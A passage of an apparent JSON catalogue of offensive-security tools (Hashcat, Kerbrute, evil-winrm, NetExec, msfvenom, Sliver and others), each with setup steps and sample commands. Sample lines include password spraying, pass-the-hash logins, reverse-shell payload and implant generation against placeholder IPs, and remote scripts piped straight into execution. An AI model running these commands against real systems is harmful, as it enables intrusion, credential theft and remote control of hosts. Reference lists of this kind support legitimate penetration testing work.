    "details": "## Description\nHashcat is the world's fastest and most advanced password recovery utility. It relies on the power of the GPU to crack hashes at high speeds.\n\n## Setup\n```bash\nsudo apt install hashcat\n# For best performance, download binary from site to use GPU drivers\n```\n\n## Usage\nDetermine the hash mode (number) and run it against a wordlist or using rules.\n\n## Useful Commands\n```bash\n# MD5 crack (Mode 0)\nhashcat -m 0 -a 0 hash.txt wordlist.txt\n\n# WPA2 crack (Mode 2500)\nhashcat -m 2500 capture.hccapx wordlist.txt\n```\n\n## Alternatives\n- **John the Ripper**",
    "source": "https://github.com/hashcat/hashcat",
    "binaries": "https://hashcat.net/hashcat/"
  },
  {
    "name": "Enum4linux-ng",
    "url": "https://github.com/cddmp/enum4linux-ng",
    "cat": "red",
    "type": "tool",
    "desc": "SMB enumeration helper",
    "details": "## Description\nEnum4linux-ng is a rewrite of the legacy enum4linux tool. It automates SMB enumeration (users, shares, policies) using tools like smbclient, rpcclient, and net.\n\n## Setup\n```bash\ngit clone [https://github.com/cddmp/enum4linux-ng.git](https://github.com/cddmp/enum4linux-ng.git)\npip install -r requirements.txt\n```\n\n## Usage\nTarget a Windows or Samba host to extract information via SMB/RPC.\n\n## Useful Commands\n```bash\n# Standard scan\n./enum4linux-ng.py 10.10.10.10 -A\n\n# Export to YAML/JSON\n./enum4linux-ng.py 10.10.10.10 -oJ output.json\n```\n\n## Alternatives\n- **NetExec**\n- **WalkSMB**",
    "source": "https://github.com/cddmp/enum4linux-ng",
    "binaries": null
  },
  {
    "name": "Kerbrute",
    "url": "https://github.com/ropnop/kerbrute",
    "cat": "red",
    "type": "tool",
    "desc": "Kerberos user enumeration",
    "details": "## Description\nKerbrute is a tool to perform Kerberos Pre-auth bruteforcing. It is faster and stealthier than NTLM bruteforcing and does not lock accounts if used for enumeration only.\n\n## Setup\nDownload the compiled binary from releases.\n\n## Usage\nUse it to validate a list of usernames against a Domain Controller.\n\n## Useful Commands\n```bash\n# Enumerate valid users from a list\n./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 users.txt\n\n# Password spray\n./kerbrute_linux_amd64 passwordspray -d domain.local passwords.txt Password123\n```\n\n## Alternatives\n- **Rubeus** (Windows)",
    "source": "https://github.com/ropnop/kerbrute",
    "binaries": "https://github.com/ropnop/kerbrute/releases"
  },
  {
    "name": "Certipy",
    "url": "https://github.com/ly4k/Certipy",
    "cat": "red",
    "type": "tool",
    "desc": "Active Directory Certificate Services assessment",
    "details": "## Description\nCertipy is a tool for enumerating and abusing Active Directory Certificate Services (AD CS). It simplifies the process of finding vulnerable certificate templates.\n\n## Setup\n```bash\npip3 install certipy-ad\n```\n\n## Usage\nUse it to dump certificate configurations, find vulnerabilities (like ESC1), and request certificates for exploitation.\n\n## Useful Commands\n```bash\n# Find vulnerable templates\ncertipy find -u user@domain.local -p pass -dc-ip 10.10.10.10\n\n# Request a certificate\ncertipy req -u user@domain.local -p pass -ca CA-Name -template VulnTemplate\n```\n\n## Alternatives\n- **Certify** (C#)",
    "source": "https://github.com/ly4k/Certipy",
    "binaries": null
  },
  {
    "name": "Ghidra",
    "url": "https://ghidra-sre.org/",
    "cat": "red",
    "type": "tool",
    "desc": "Reverse engineering suite",
    "details": "## Description\nGhidra is a software reverse engineering (SRE) suite of tools developed by NSA's Research Directorate. It is used for analyzing compiled code (malware or binaries).\n\n## Setup\nRequires JDK 17+. Download zip, extract, and run `./ghidraRun`.\n\n## Usage\nImport a binary to disassemble and decompile it. It provides a visual graph of code flow and pseudo-code generation.\n\n## Features\n- **Disassembler:** View assembly.\n- **Decompiler:** View pseudo-C code (highly readable).\n- **Graph View:** Visualize control flow.\n\n## Alternatives\n- **IDA Pro**\n- **Radare2**",
    "source": "https://github.com/NationalSecurityAgency/ghidra",
    "binaries": "https://github.com/NationalSecurityAgency/ghidra/releases"
  },
  {
    "name": "radare2",
    "url": "https://rada.re/n/",
    "cat": "red",
    "type": "tool",
    "desc": "Reverse engineering framework",
    "details": "## Description\nradare2 is a portable reversing framework. It is CLI-based, scriptable, and supports many architectures.\n\n## Setup\n```bash\ngit clone [https://github.com/radareorg/radare2](https://github.com/radareorg/radare2)\nradare2/sys/install.sh\n```\n\n## Usage\nUse it to open binaries, analyze code structures, patch bytes, and debug applications.\n\n## Useful Commands\n```bash\n# Open binary\nr2 ./binary\n\n# Inside r2:\naaa       # Analyze all\npdf       # Print disassembly function\niz        # List strings\n```\n\n## Alternatives\n- **Ghidra**\n- **Cutter** (GUI for r2)",
    "source": "https://github.com/radareorg/radare2",
    "binaries": "https://github.com/radareorg/radare2/releases"
  },
  {
    "name": "Frida",
    "url": "https://frida.re/",
    "cat": "red",
    "type": "tool",
    "desc": "Dynamic instrumentation (mobile/app testing)",
    "details": "## Description\nFrida is a dynamic code instrumentation toolkit. It lets you inject snippets of JavaScript or your own library into native apps on Windows, macOS, Linux, iOS, Android, and QNX.\n\n## Setup\n```bash\npip install frida-tools\n# For mobile, download frida-server binary to device\n```\n\n## Usage\nConnect to a running process to hook functions, trace execution, or modify logic on the fly.\n\n## Useful Commands\n```bash\n# List running processes\nfrida-ps -U\n\n# Trace a function\nfrida-trace -U -i \"open*\" com.target.app\n```\n\n## Alternatives\n- **Objection** (Runtime Mobile Exploration)",
    "source": "https://github.com/frida/frida",
    "binaries": "https://github.com/frida/frida/releases"
  },
  {
    "name": "MobSF",
    "url": "https://mobsf.github.io/docs/",
    "cat": "red",
    "type": "tool",
    "desc": "Mobile security testing framework",
    "details": "## Description\nMobSF (Mobile Security Framework) is an automated, all-in-one mobile application (Android/iOS/Windows) pen-testing, malware analysis and security assessment framework.\n\n## Setup\nThe easiest way is Docker:\n```bash\ndocker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest\n```\n\n## Usage\nRun the web interface, upload an APK or IPA file, and it will perform static and dynamic analysis to generate a report.\n\n## Workflow\n1. Run MobSF.\n2. Navigate to `http://localhost:8000`.\n3. Drag and drop `.apk` or `.ipa` file.\n\n## Alternatives\n- **QARK**",
    "source": "https://github.com/MobSF/Mobile-Security-Framework-MobSF",
    "binaries": null
  },
  {
    "name": "gowitness",
    "url": "https://github.com/sensepost/gowitness",
    "cat": "red",
    "type": "tool",
    "desc": "Screenshot and report web targets",
    "details": "## Description\ngowitness is a golang, web screenshot utility using Chrome Headless. It is useful for visual reconnaissance of large lists of URLs.\n\n## Setup\n```bash\ngo install [github.com/sensepost/gowitness@latest](https://github.com/sensepost/gowitness@latest)\n```\n\n## Usage\nFeed it a list of URLs, and it will save screenshots and header information to a database and generate a report.\n\n## Useful Commands\n```bash\n# Screenshot a single URL\ngowitness single --url [https://example.com](https://example.com)\n\n# Screenshot a list of URLs\ngowitness file -f urls.txt\n\n# Start report server\ngowitness report serve\n```\n\n## Alternatives\n- **EyeWitness**\n- **Aquatone**",
    "source": "https://github.com/sensepost/gowitness",
    "binaries": "https://github.com/sensepost/gowitness/releases"
  },
  {
    "name": "EyeWitness",
    "url": "https://github.com/FortyNorthSecurity/EyeWitness",
    "cat": "red",
    "type": "tool",
    "desc": "Web target screenshotting and reporting",
    "details": "## Description\nEyeWitness is designed to take screenshots of websites, provide some server header info, and identify default credentials if known.\n\n## Setup\n```bash\ngit clone [https://github.com/FortyNorthSecurity/EyeWitness.git](https://github.com/FortyNorthSecurity/EyeWitness.git)\ncd EyeWitness/Python/setup && ./setup.sh\n```\n\n## Usage\nIt is used to triage a large number of web services to determine which ones are worth further investigation.\n\n## Useful Commands\n```bash\n# Scan list of URLs\n./EyeWitness.py -f urls.txt --web\n```\n\n## Alternatives\n- **gowitness**",
    "source": "https://github.com/FortyNorthSecurity/EyeWitness",
    "binaries": null
  },
  {
    "name": "WhatWeb",
    "url": "https://github.com/urbanadventurer/WhatWeb",
    "cat": "red",
    "type": "tool",
    "desc": "Website fingerprinting",
    "details": "## Description\nWhatWeb identifies websites. It recognizes web technologies including CMS, blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.\n\n## Setup\n```bash\nsudo apt install whatweb\n```\n\n## Usage\nRun against a URL to identify the underlying technologies and versions.\n\n## Useful Commands\n```bash\n# Standard scan\nwhatweb example.com\n\n# Aggressive scan (more intrusive)\nwhatweb -a 3 example.com\n```\n\n## Alternatives\n- **Wappalyzer**\n- **httpx**",
    "source": "https://github.com/urbanadventurer/WhatWeb",
    "binaries": null
  },
  {
    "name": "testssl.sh",
    "url": "https://testssl.sh/",
    "cat": "red",
    "type": "tool",
    "desc": "TLS/SSL configuration tester",
    "details": "## Description\ntestssl.sh is a free command line tool which checks a server's service on any port for the support of TLS/SSL ciphers, protocols as well as some cryptographic flaws.\n\n## Setup\n```bash\ngit clone --depth 1 [https://github.com/drwetter/testssl.sh.git](https://github.com/drwetter/testssl.sh.git)\ncd testssl.sh\nchmod +x testssl.sh\n```\n\n## Usage\nIt does not rely on third-party libraries (only bash and openssl) to perform deep analysis of SSL/TLS configurations.\n\n## Useful Commands\n```bash\n# Test a site and output HTML\n./testssl.sh --htmlfile report.html [https://example.com](https://example.com)\n```\n\n## Alternatives\n- **sslyze**\n- **SSL Labs**",
    "source": "https://github.com/drwetter/testssl.sh",
    "binaries": "https://github.com/drwetter/testssl.sh/releases"
  },
  {
    "name": "sslyze",
    "url": "https://github.com/nabla-c0d3/sslyze",
    "cat": "red",
    "type": "tool",
    "desc": "Fast TLS configuration scanner",
    "details": "## Description\nSSLyze is a fast and powerful SSL/TLS scanning library. It helps to analyze the SSL configuration of a server.\n\n## Setup\n```bash\npip install sslyze\n```\n\n## Usage\nUse it to check for weak ciphers, expired certificates, and outdated protocols.\n\n## Useful Commands\n```bash\n# Scan target\nsslyze --regular [www.example.com](https://www.example.com)\n```\n\n## Alternatives\n- **testssl.sh**",
    "source": "https://github.com/nabla-c0d3/sslyze",
    "binaries": null
  },
  {
    "name": "SSH Audit",
    "url": "https://github.com/jtesta/ssh-audit",
    "cat": "red",
    "type": "tool",
    "desc": "SSH server/client configuration audit",
    "details": "## Description\nssh-audit checks SSH server & client configuration for weak algorithms, keys, and other security issues.\n\n## Setup\n```bash\npip install ssh-audit\n```\n\n## Usage\nPoint it at an SSH server to receive a report on supported algorithms and their security rating.\n\n## Useful Commands\n```bash\n# Audit a server\nssh-audit 10.10.10.10\n```\n\n## Alternatives\n- **nmap** (ssh scripts)",
    "source": "https://github.com/jtesta/ssh-audit",
    "binaries": "https://github.com/jtesta/ssh-audit/releases"
  },
  {
    "name": "Caldera",
    "url": "https://caldera.mitre.org/",
    "cat": "red",
    "type": "tool",
    "desc": "Adversary emulation (use for purple teaming)",
    "details": "## Description\nMITRE Caldera is a cyber security framework designed to easily automate adversary emulation, assist manual red teams, and automate incident response.\n\n## Setup\n```bash\ngit clone [https://github.com/mitre/caldera.git](https://github.com/mitre/caldera.git) --recursive\npip install -r requirements.txt\npython3 server.py\n```\n\n## Usage\nUse the web interface to deploy agents and run 'Operations' which are chains of attack steps (Abilities) mapped to the ATT&CK framework.\n\n## Workflow\n1. Login to Web Interface.\n2. Deploy an Agent.\n3. Create an Operation (Adversary Profile).\n\n## Alternatives\n- **Atomic Red Team**\n- **Prelude Operator**",
    "source": "https://github.com/mitre/caldera",
    "binaries": "https://github.com/mitre/caldera/releases"
  },
  {
    "name": "NetExec (nxc)",
    "url": "https://github.com/Pennyw0rth/NetExec",
    "cat": "red",
    "type": "tool",
    "desc": "SMB/AD assessment framework",
    "details": "## Description\nNetExec (nxc) is a network exploitation tool that automates assessing the security of large Active Directory networks. It is the maintained successor to CrackMapExec.\n\n## Setup\n```bash\npipx install git+[https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)\n```\n\n## Usage\nUse it to perform password spraying, enumerate users/shares, and execute commands across multiple hosts simultaneously.\n\n## Useful Commands\n```bash\n# Spray passwords\nnxc smb 10.10.10.0/24 -u users.txt -p Password123\n\n# Execute command\nnxc smb 10.10.10.10 -u user -p pass -x \"whoami\"\n```\n\n## Alternatives\n- **Impacket**",
    "source": "https://github.com/Pennyw0rth/NetExec",
    "binaries": "https://github.com/Pennyw0rth/NetExec/releases"
  },
  {
    "name": "CrackMapExec (CME) (legacy)",
    "url": "https://github.com/byt3bl33d3r/CrackMapExec",
    "cat": "red",
    "type": "tool",
    "desc": "SMB/AD post-exploitation framework",
    "details": "## Description\nCrackMapExec was a popular post-exploitation tool for assessing Active Directory. It has been archived and replaced by NetExec.\n\n## Status\n**Legacy/Archived.** Please use **NetExec** instead.\n\n## Setup\n```bash\npip install crackmapexec\n```\n\n## Usage\nUsed for enumerating logged on users and spidering SMB shares, executing psexec style attacks, and more.\n\n## Alternatives\n- **NetExec** (Recommended)",
    "source": "https://github.com/byt3bl33d3r/CrackMapExec",
    "binaries": "https://github.com/byt3bl33d3r/CrackMapExec/releases"
  },
  {
    "name": "evil-winrm",
    "url": "https://github.com/Hackplayers/evil-winrm",
    "cat": "red",
    "type": "tool",
    "desc": "WinRM client for Windows administration",
    "details": "## Description\nevil-winrm is the ultimate WinRM shell for hacking/pentesting. It allows you to obtain a shell on Windows hosts with WinRM enabled.\n\n## Setup\n```bash\ngem install evil-winrm\n```\n\n## Usage\nConnect to a target using credentials or hashes. It supports file upload/download and loading PowerShell scripts in memory.\n\n## Useful Commands\n```bash\n# Connect with credentials\nevil-winrm -i 10.10.10.10 -u Administrator -p 'Password123'\n\n# Connect with Hash (Pass-the-Hash)\nevil-winrm -i 10.10.10.10 -u Administrator -H <NTLM Hash>\n```\n\n## Alternatives\n- **Enter-PSSession** (Windows Native)\n- **Impacket** (psexec)",
    "source": "https://github.com/Hackplayers/evil-winrm",
    "binaries": null
  },
  {
    "name": "ldapdomaindump",
    "url": "https://github.com/dirkjanm/ldapdomaindump",
    "cat": "red",
    "type": "tool",
    "desc": "Dump AD LDAP info",
    "details": "## Description\nldapdomaindump is a tool for dumping information from Active Directory via LDAP and converting it to human-readable formats (HTML/JSON).\n\n## Setup\n```bash\npip install ldapdomaindump\n```\n\n## Usage\nAuthenticate to LDAP and extract user list, groups, computers, and trust relationships.\n\n## Useful Commands\n```bash\n# Dump info to HTML files\nldapdomaindump -u 'DOMAIN\\User' -p 'Password' 10.10.10.10\n```\n\n## Alternatives\n- **BloodHound**\n- **Windapsearch**",
    "source": "https://github.com/dirkjanm/ldapdomaindump",
    "binaries": null
  },
  {
    "name": "ScoutSuite",
    "url": "https://github.com/nccgroup/ScoutSuite",
    "cat": "red",
    "type": "tool",
    "desc": "Multi-cloud security auditing",
    "details": "## Description\nScoutSuite is an open source multi-cloud security-auditing tool. It connects to the API of Cloud providers (AWS, Azure, GCP, etc.) and gathers configuration data for manual inspection.\n\n## Setup\n```bash\npip install scoutsuite\n```\n\n## Usage\nAuthenticate with your cloud CLI and run ScoutSuite to generate an HTML report highlighting risk areas.\n\n## Useful Commands\n```bash\n# Audit AWS (requires configured CLI)\nscout aws\n\n# Audit Azure\nscout azure --cli\n```\n\n## Alternatives\n- **Prowler**\n- **CloudSploit**",
    "source": "https://github.com/nccgroup/ScoutSuite",
    "binaries": null
  },
  {
    "name": "Prowler",
    "url": "https://github.com/prowler-cloud/prowler",
    "cat": "red",
    "type": "tool",
    "desc": "AWS security auditing and checks",
    "details": "## Description\nProwler is an Open Source security tool to perform AWS security best practices assessments, audits, incident response, continuous monitoring, hardening and forensics readiness.\n\n## Setup\n```bash\npip install prowler\n```\n\n## Usage\nRun prowler from the CLI. It performs hundreds of checks covering CIS benchmarks, GDPR, HIPAA, etc.\n\n## Useful Commands\n```bash\n# Run all checks\nprowler aws\n\n# Run specific checks (e.g., S3)\nprowler aws --services s3\n```\n\n## Alternatives\n- **ScoutSuite**",
    "source": "https://github.com/prowler-cloud/prowler",
    "binaries": null
  },
  {
    "name": "Mindblowing",
    "url": "https://github.com/0x8e5afe/mindblowing",
    "cat": "red",
    "type": "tool",
    "desc": "Interactive pentest mind maps with zero build steps",
    "details": "## Description\nMindblowing provides offline-first interactive mind maps for Pentesting and Active Directory. It is useful for tracking progress and recalling commands during an engagement.\n\n## Setup\nNo installation required. \n1. Download or clone the repo.\n2. Open `index.html` in your browser.\n\n## Usage\nNavigate the mind map by clicking nodes. Use the checkboxes to mark progress and the side panel to copy commands.\n\n## Features\n- Click nodes to expand.\n- Checkboxes to mark progress.\n- Copyable commands in the side panel.\n\n## Alternatives\n- **XMind**\n- **Obsidian**",
    "source": "https://github.com/0x8e5afe/mindblowing",
    "binaries": null
  },
  {
    "name": "Pwnsheet",
    "url": "https://github.com/0x8e5afe/pwnsheet",
    "cat": "red",
    "type": "tool",
    "desc": "Dynamic pentesting cheatsheets that turn Markdown notes into an interactive workspace",
    "details": "## Description\nPwnsheet turns static markdown notes into a dynamic workspace. It allows you to define variables (like Target IP) which automatically update all commands in the cheatsheet.\n\n## Setup\n```bash\ngit clone [https://github.com/0x8e5afe/pwnsheet.git](https://github.com/0x8e5afe/pwnsheet.git)\ncd pwnsheet\npython3 -m http.server 8000\n# Open localhost:8000 in browser\n```\n\n## Usage\nEdit the underlying markdown files to add your own notes. Use the web interface to toggle checkboxes and copy pre-filled commands.\n\n## Alternatives\n- **PayloadsAllTheThings**",
    "source": "https://github.com/0x8e5afe/pwnsheet",
    "binaries": null
  },
  {
    "name": "revshells",
    "url": "https://www.revshells.com/",
    "cat": "red",
    "type": "tool",
    "desc": "Reverse shell payload generator",
    "details": "## Description\nRevshells is a hosted (or self-hosted) web tool to quickly generate reverse shell commands for various languages and listener configurations.\n\n## Setup\nWeb-based tool. No setup required (hosted). \nFor offline use: Clone the repo and open `index.html`.\n\n## Usage\nSelect your target OS, desired language (Bash, Python, PowerShell), enter your IP/Port, and copy the generated one-liner.\n\n## Features\n- IP/Port auto-filling.\n- Shell encoding (Base64, URL).\n- Listener command generation.\n\n## Alternatives\n- **msfvenom**\n- **Shellerator**",
    "source": "https://github.com/0dayCTF/reverse-shell-generator",
    "binaries": null
  },
  {
    "name": "msfvenom",
    "url": "https://docs.metasploit.com/",
    "cat": "red",
    "type": "tool",
    "desc": "Payload generation utility",
    "details": "## Description\nmsfvenom is a standalone payload generator that comes with the Metasploit Framework. It is used to create and encode shellcode and binaries.\n\n## Setup\nIncluded with Metasploit Framework.\n\n## Usage\nSpecify the payload type, architecture, encoder, and output format to generate a malicious file.\n\n## Useful Commands\n```bash\n# Windows Reverse TCP Executable\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe\n\n# PHP Web Shell\nmsfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php\n```\n\n## Alternatives\n- **Veil**\n- **Sliver** (Generate Implant)",
    "source": "https://github.com/rapid7/metasploit-framework",
    "binaries": null
  },
  {
    "name": "shcheck",
    "url": "https://github.com/santoru/shcheck",
    "cat": "red",
    "type": "tool",
    "desc": "Shellshock vulnerability checker",
    "details": "## Description\nshcheck is a script to detect Shellshock vulnerabilities in CGI scripts and web-exposed Bash environments.\n\n## Setup\n```bash\ngit clone [https://github.com/santoru/shcheck.git](https://github.com/santoru/shcheck.git)\n```\n\n## Usage\nPass a URL to the script. It sends crafted HTTP headers to check if the server is vulnerable to arbitrary command execution.\n\n## Useful Commands\n```bash\n# Check a URL\npython shcheck.py [http://target.com/cgi-bin/test.cgi](http://target.com/cgi-bin/test.cgi)\n```\n\n## Alternatives\n- **nmap** (--script http-shellshock)",
    "source": "https://github.com/santoru/shcheck",
    "binaries": null
  },
  {
    "name": "pspy",
    "url": "https://github.com/DominicBreuker/pspy",
    "cat": "red",
    "type": "tool",
    "desc": "Monitor processes without root (Linux)",
    "details": "## Description\npspy is a command-line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they happen.\n\n## Setup\n```bash\n# Download the static binary (upload to target)\nwget [https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64](https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64)\nchmod +x pspy64\n```\n\n## Usage\nExecute on a Linux host to monitor real-time process creation events.\n\n## Useful Commands\n```bash\n./pspy64\n```\n\n## Alternatives\n- **auditd**",
    "source": "https://github.com/DominicBreuker/pspy",
    "binaries": "https://github.com/DominicBreuker/pspy/releases"
  },
  {
    "name": "LinEnum",
    "url": "https://github.com/rebootuser/LinEnum",
    "cat": "red",
    "type": "tool",
    "desc": "Linux local enumeration script",
    "details": "## Description\nLinEnum is a shell script that enumerates system information, users, network info, and potential privilege escalation vectors on Linux.\n\n## Setup\n```bash\nwget [https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)\nchmod +x LinEnum.sh\n```\n\n## Usage\nRun the script on the target machine. It performs a wide range of checks and outputs the results to stdout.\n\n## Useful Commands\n```bash\n./LinEnum.sh -t\n```\n\n## Alternatives\n- **LinPEAS**",
    "source": "https://github.com/rebootuser/LinEnum",
    "binaries": null
  },
  {
    "name": "Linux Exploit Suggester",
    "url": "https://github.com/mzet-/linux-exploit-suggester",
    "cat": "red",
    "type": "tool",
    "desc": "Suggest kernel exploits based on version",
    "details": "## Description\nLinux Exploit Suggester is a script that assesses the kernel version and running processes to suggest possible public exploits.\n\n## Setup\n```bash\nwget [https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh](https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh) -O les.sh\nchmod +x les.sh\n```\n\n## Usage\nRun it directly on the target or feed it the output of `uname -a` locally.\n\n## Useful Commands\n```bash\n# Run on target\n./les.sh\n\n# Run locally with 'uname -a' input\n./les.sh --uname \"Linux target 4.4.0...\"\n```\n\n## Alternatives\n- **Searchsploit**",
    "source": "https://github.com/mzet-/linux-exploit-suggester",
    "binaries": null
  },
  {
    "name": "searchsploit",
    "url": "https://www.exploit-db.com/searchsploit",
    "cat": "red",
    "type": "tool",
    "desc": "Offline exploit database search",
    "details": "## Description\nSearchsploit is a command line search tool for Exploit-DB. It allows you to take a copy of the exploit database with you offline.\n\n## Setup\n```bash\nsudo apt install exploitdb\n```\n\n## Usage\nSearch for vulnerabilities by software name and version. It provides paths to the exploit code.\n\n## Useful Commands\n```bash\n# Search for a term\nsearchsploit wordpress 5.0\n\n# Mirror exploit to current folder\nsearchsploit -m 12345.py\n```\n\n## Alternatives\n- **Online CVE Databases**",
    "source": "https://github.com/offensive-security/exploitdb",
    "binaries": null
  },
  {
    "name": "Chisel",
    "url": "https://github.com/jpillora/chisel",
    "cat": "red",
    "type": "tool",
    "desc": "TCP tunneling over HTTP",
    "details": "## Description\nChisel is a fast TCP/UDP tunnel over HTTP. It is useful for passing through firewalls that only allow HTTP traffic.\n\n## Setup\nDownload binary from releases (requires binary on both Client and Server).\n\n## Usage\nSet up a server on your machine and a client on the target to forward ports.\n\n## Useful Commands\n```bash\n# Server (Attacker machine)\n./chisel server -p 8000 --reverse\n\n# Client (Victim machine)\n./chisel client 10.10.10.10:8000 R:8888:127.0.0.1:8888\n```\n\n## Alternatives\n- **Ligolo-ng**\n- **SSH Remote Forwarding**",
    "source": "https://github.com/jpillora/chisel",
    "binaries": "https://github.com/jpillora/chisel/releases"
  },
  {
    "name": "Ligolo-ng",
    "url": "https://github.com/nicocha30/ligolo-ng",
    "cat": "red",
    "type": "tool",
    "desc": "Modern tunneling and pivoting tool",
    "details": "## Description\nLigolo-ng is an advanced pivoting tool using TUN interfaces. It provides better performance and usability than Chisel or Proxychains.\n\n## Setup\nDownload proxy (for attacker) and agent (for target) binaries.\n\n## Usage\nIt creates a VPN-like connection between attacker and victim, allowing you to route traffic directly to internal networks.\n\n## Workflow\n1. (Attacker) Create TUN interface and run proxy.\n2. (Target) Run agent connecting back to proxy.\n3. (Attacker) Add route to target subnet.\n\n## Alternatives\n- **Chisel**\n- **Sshuttle**",
    "source": "https://github.com/nicocha30/ligolo-ng",
    "binaries": "https://github.com/nicocha30/ligolo-ng/releases"
  },
  {
    "name": "Updog",
    "url": "https://github.com/sc0tfree/updog",
    "cat": "red",
    "type": "tool",
    "desc": "Simple file transfer HTTP server",
    "details": "## Description\nUpdog is a replacement for `python -m http.server`. It allows downloading *and* uploading files via the browser.\n\n## Setup\n```bash\npip install updog\n```\n\n## Usage\nStart the server in a directory to serve files. It provides a clean web interface.\n\n## Useful Commands\n```bash\n# Start server on port 8000\nupdog -p 8000\n\n# Start with SSL\nupdog --ssl\n```\n\n## Alternatives\n- **Python http.server**\n- **HFS**",
    "source": "https://github.com/sc0tfree/updog",
    "binaries": null
  },
  {
    "name": "Atomic Red Team",
    "url": "https://atomicredteam.io/",
    "cat": "red",
    "type": "tool",
    "desc": "Small, focused ATT&CK technique tests",
    "details": "## Description\nAtomic Red Team is a library of simple tests that every security team can execute to test their controls. Each test is mapped to MITRE ATT&CK.\n\n## Setup\n```powershell\nIEX (IWR '[https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1](https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1)' -UseBasicParsing); \nInstall-AtomicRedTeam\n```\n\n## Usage\nExecute specific techniques to see if your security tools detect or block the behavior.\n\n## Useful Commands\n```powershell\n# Run a specific technique (e.g., T1003)\nInvoke-AtomicTest T1003\n```\n\n## Alternatives\n- **Caldera**",
    "source": "https://github.com/redcanaryco/atomic-red-team",
    "binaries": null
  },
  {
    "name": "Cobalt Strike (concept)",
    "url": "https://www.cobaltstrike.com/",
    "cat": "red",
    "type": "tool",
    "desc": "Commercial adversary simulation platform",
    "details": "## Description\nCobalt Strike is a commercial adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors.\n\n## Setup\nCommercial license required. Java based.\n\n## Usage\nUse the client to manage 'Beacons' (agents) deployed on target machines. It provides powerful lateral movement and data exfiltration capabilities.\n\n## Key Features\n- **Malleable C2:** Change network traffic indicators to look like legitimate traffic (e.g., jQuery, Amazon).\n- **Beacon:** The payload agent.\n\n## Alternatives\n- **Sliver**\n- **Havoc**",
    "source": null,
    "binaries": null
  },
  {
    "name": "Sliver",
    "url": "https://sliver.sh/",
    "cat": "red",
    "type": "tool",
    "desc": "Open-source red team C2 framework",
    "details": "## Description\nSliver is an open source cross-platform adversary emulation/red team framework. It supports C2 over Mutual-TLS, HTTP(S), and DNS.\n\n## Setup\n```bash\n# Linux Installer\ncurl [https://sliver.sh/install](https://sliver.sh/install)|sudo bash\n```\n\n## Usage\nGenerate implants for targets and manage them via the Sliver console. It offers robust features comparable to commercial tools.\n\n## Useful Commands\n```bash\n# Start server\nsliver-server\n\n# Generate implant\ngenerate --mtls 10.10.10.10 --save /tmp/implant\n```\n\n## Alternatives\n- **Mythic**\n- **Cobalt Strike**",
    "source": "https://github.com/BishopFox/sliver",
    "binaries": "https://github.com/BishopFox/sliver/releases"
  },
  {
    "name": "Mythic",
    "url": "https://docs.mythic-c2.net/",
    "cat": "red",
    "type": "tool",
    "desc": "Pluggable C2 framework",
    "details": "## Description\nMythic is a collaborative, multi-platform, red teaming framework. It uses a web interface and docker containers for different agents (Payload Types).\n\n## Setup\n```bash\ngit clone [https://github.com/its-a-feature/Mythic](https://github.com/its-a-feature/Mythic)\ncd Mythic\n./install_docker_ubuntu.sh\nmake\n```\n\n## Usage\nInstall specific agents (like Apollo, Poseidon) into Mythic and control them via the web UI.\n\n## Alternatives\n- **Sliver**",
    "source": "https://github.com/its-a-feature/Mythic",
    "binaries": null
  }
);